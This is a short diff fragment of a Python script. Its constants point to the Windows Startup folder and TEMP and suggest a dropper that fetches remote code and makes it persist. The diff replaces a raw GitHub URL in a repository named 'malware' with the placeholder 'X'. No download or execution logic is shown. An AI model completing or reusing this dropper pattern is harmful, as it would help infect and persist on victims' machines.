@@ -3,7 +3,7 @@ import requests, os, subprocess, shutil, string, random
 
 STARTUP = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 TEMP = os.getenv('TEMP')
-URL = 'https://raw.githubusercontent.com/heygdrg/malware/main/_main_.py'
+URL = 'X'
 
 PATH = {
     'script_path' : TEMP + '\\' + 'main.py',
